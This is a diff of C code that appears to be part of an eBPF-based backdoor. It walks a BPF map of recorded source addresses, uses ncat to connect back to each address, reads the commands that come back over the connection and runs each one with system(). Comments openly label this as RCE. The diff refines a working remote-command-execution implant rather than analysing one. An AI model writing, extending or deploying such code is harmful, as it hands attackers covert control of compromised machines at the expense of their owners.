@@ -73,24 +73,32 @@ int main(int argc, char **argv) {
       while (!bpf_map_get_next_key(fd, &lookup_key, &next_key)) {
         err = bpf_map_lookup_elem(fd, &next_key, &ret);
         if (err < 0) {
-          return -1;
+          continue;
         }
+        // Dial back to the remote
+        // Saturn Valley. If you know, you know.
+        char saddrval[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &ret.saddr, saddrval, sizeof (saddrval));
+        printf("Dialing source for RCE: %s\n", saddrval);
 
-        char addrbuf[INET_ADDRSTRLEN];
-        inet_ntop(AF_INET, &ret.saddr, addrbuf, sizeof (addrbuf));
-
-        printf("Begin reverse TCP protocol. Dial: %s\n", addrbuf);
-
-        // TODO Dial back to source addr for the command to execute!
-
-        char cmd[512];
-        sprintf(cmd, "ncat %s %d", addrbuf, PORT);
-        printf("%s\n", cmd);
-        system(cmd);
+        // Find the RCE from the source
+        char cmd[1024];
+        char rce[1024];
+        sprintf(cmd, "ncat %s %d", saddrval, PORT);
+        FILE *fp;
+        fp = popen(cmd, "r");
+        if (fp == NULL) {
+          continue;
+        }
+        while (fgets(rce, sizeof rce, fp) != NULL) {
+          // RCE here
+          printf("RCE: %s\n", rce);
+          system(rce);
+        }
 
         err = bpf_map_delete_elem(fd, &next_key);
         if (err < 0) {
-          return -1;
+          return 0;
         }
         lookup_key = next_key;
       }
